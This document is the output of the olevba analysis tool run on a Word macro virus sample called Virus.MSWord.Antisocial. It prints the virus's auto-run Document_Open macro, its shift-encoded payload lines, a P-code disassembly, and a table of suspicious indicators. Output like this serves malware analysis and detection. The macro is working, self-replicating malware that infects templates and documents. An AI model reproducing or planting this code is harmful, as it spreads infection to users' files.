olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Antisocial
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Antisocial - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
If MacroContainer.FullName = ActiveDocument.FullName Then GoTo ADD Else GoTo NDD
NDD: For d = 11 To NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: C$ = ""
I = (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
F = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - F: C$ = C$ & Chr(B$): Next X: A = C$
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: End
ADD: For d = 11 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: C$ = ""
I = (ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
F = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - F: C$ = C$ & Chr(B$): Next X: A = C$
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: End Sub
'6Vxo|gzk&Y{h&Jui{sktzeIruyk./@&Ut&Kxxux&Xky{sk&Tk~z@&IussgtjHgxy.(Zuury(/4Iutzxury.(Sgixu(/4Jkrkzk
'5Tuyntsx3Xf{jStwrfqUwtruy%B%5?%Tuyntsx3HtsknwrHts{jwxntsx%B%5?%Tuyntsx3[nwzxUwtyjhynts%B%5
'5Nk%If~-St|.%B%6%Ymjs%X~xyjr3Uwn{fyjUwtknqjXywnsl-'H?aFzytwzs3nsk'1%'Fzytwzs'1%'Tujs'.%B%'Ijqywjj%4^%H?a'
'3Iru#g#@#44#Wr#PdfurFrqwdlqhu1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh1FrxqwRiOlqhv=#F'#@#%%
'3L#@#+PdfurFrqwdlqhu1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh1Olqhv+g/#4,,
'7M'D'Pu{/Yuk'1'?0'2'8A'Mvy'_'D'8'[v'Slu/P0A'I+'D'Hzj/Tpk/P3'_3'800'2'MA'J+'D'J+'-'Joy/I+0A'Ul{'_A'H'D'J+
'1NbdspDpoubjofs/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/SfqmbdfMjof!e-!#(#!'!G!'!B;!Ofyu!e
'7Vwlu')JAcIl{yh€5pup)'Mvy'V|{w|{'Hz'*8A'Wypu{'*83'ThjyvJvu{hpuly5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Spulz/83'ThjyvJvu{hpuly5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Jv|u{VmSpulz0A'Jsvzl'*8
'7Uvyths[ltwsh{l5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Klsl{lSpulz'83'Uvyths[ltwsh{l5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Jv|u{VmSpulz
'6Gizo|kJui{sktz4\HVxupkiz4\HIusvutktzy4Ozks.7/4IujkSuj{rk4JkrkzkRotky&72&Gizo|kJui{sktz4\HVxupkiz4\HIusvutktzy4Ozks.7/4IujkSuj{rk4Iu{tzUlRotky
'1OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/BeeGspnGjmf!)#D;]Cfusbz/joj#*
'4EgxmziHsgyqirx2ZFTvsnigx2ZFGsqtsrirxw2Mxiq,5-2GshiQshypi2EhhJvsqJmpi$,&G>`Fixve}2mrm&-
'7Hj{p}lKvj|tlu{5Zh}lHz'MpslUhtlADHj{p}lKvj|tlu{5M|ssUhtlA'Luk'Z|i
'7.Il{yh€…I€…S€z…Rv}pjR…Olssv…]_lyz…Huk…H]lyz
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Antisocial
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5828 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #1:
' 	Ld MacroContainer 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ADD 
' 	Else 
' 	BoSImplicit 
' 	GoTo NDD 
' 	EndIf 
' Line #2:
' 	Label NDD 
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	LitDI2 0x000B 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St C$ 
' Line #3:
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St I 
' Line #4:
' 	Ld I 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	St False 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld I 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld I 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld False 
' 	Sub 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld C$ 
' 	Ld B$ 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C$ 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld C$ 
' 	St A 
' Line #5:
' 	Ld d 
' 	Ld A 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	End 
' Line #6:
' 	Label ADD 
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	LitDI2 0x000B 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St C$ 
' Line #7:
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St I 
' Line #8:
' 	Ld I 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	St False 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld I 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld I 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld False 
' 	Sub 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld C$ 
' 	Ld B$ 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C$ 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld C$ 
' 	St A 
' Line #9:
' 	Ld d 
' 	Ld A 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndSub 
' Line #10:
' 	QuoteRem 0x0000 0x0062 "6Vxo|gzk&Y{h&Jui{sktzeIruyk./@&Ut&Kxxux&Xky{sk&Tk~z@&IussgtjHgxy.(Zuury(/4Iutzxury.(Sgixu(/4Jkrkzk"
' Line #11:
' 	QuoteRem 0x0000 0x005A "5Tuyntsx3Xf{jStwrfqUwtruy%B%5?%Tuyntsx3HtsknwrHts{jwxntsx%B%5?%Tuyntsx3[nwzxUwtyjhynts%B%5"
' Line #12:
' 	QuoteRem 0x0000 0x0069 "5Nk%If~-St|.%B%6%Ymjs%X~xyjr3Uwn{fyjUwtknqjXywnsl-'H?aFzytwzs3nsk'1%'Fzytwzs'1%'Tujs'.%B%'Ijqywjj%4^%H?a'"
' Line #13:
' 	QuoteRem 0x0000 0x005D "3Iru#g#@#44#Wr#PdfurFrqwdlqhu1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh1FrxqwRiOlqhv=#F'#@#%%"
' Line #14:
' 	QuoteRem 0x0000 0x004B "3L#@#+PdfurFrqwdlqhu1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh1Olqhv+g/#4,,"
' Line #15:
' 	QuoteRem 0x0000 0x0069 "7M'D'Pu{/Yuk'1'?0'2'8A'Mvy'_'D'8'[v'Slu/P0A'I+'D'Hzj/Tpk/P3'_3'800'2'MA'J+'D'J+'-'Joy/I+0A'Ul{'_A'H'D'J+"
' Line #16:
' 	QuoteRem 0x0000 0x005C "1NbdspDpoubjofs/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/SfqmbdfMjof!e-!#(#!'!G!'!B;!Ofyu!e"
' Line #17:
' 	QuoteRem 0x0000 0x00C4 "7Vwlu')JAcIl{yh€5pup)'Mvy'V|{w|{'Hz'*8A'Wypu{'*83'ThjyvJvu{hpuly5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Spulz/83'ThjyvJvu{hpuly5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Jv|u{VmSpulz0A'Jsvzl'*8"
' Line #18:
' 	QuoteRem 0x0000 0x008E "7Uvyths[ltwsh{l5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Klsl{lSpulz'83'Uvyths[ltwsh{l5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Jv|u{VmSpulz"
' Line #19:
' 	QuoteRem 0x0000 0x008E "6Gizo|kJui{sktz4\HVxupkiz4\HIusvutktzy4Ozks.7/4IujkSuj{rk4JkrkzkRotky&72&Gizo|kJui{sktz4\HVxupkiz4\HIusvutktzy4Ozks.7/4IujkSuj{rk4Iu{tzUlRotky"
' Line #20:
' 	QuoteRem 0x0000 0x0057 "1OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/BeeGspnGjmf!)#D;]Cfusbz/joj#*"
' Line #21:
' 	QuoteRem 0x0000 0x0057 "4EgxmziHsgyqirx2ZFTvsnigx2ZFGsqtsrirxw2Mxiq,5-2GshiQshypi2EhhJvsqJmpi$,&G>`Fixve}2mrm&-"
' Line #22:
' 	QuoteRem 0x0000 0x0041 "7Hj{p}lKvj|tlu{5Zh}lHz'MpslUhtlADHj{p}lKvj|tlu{5M|ssUhtlA'Luk'Z|i"
' Line #23:
' 	QuoteRem 0x0000 0x002C "7.Il{yh€…I€…S€z…Rv}pjR…Olssv…]_lyz…Huk…H]lyz"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

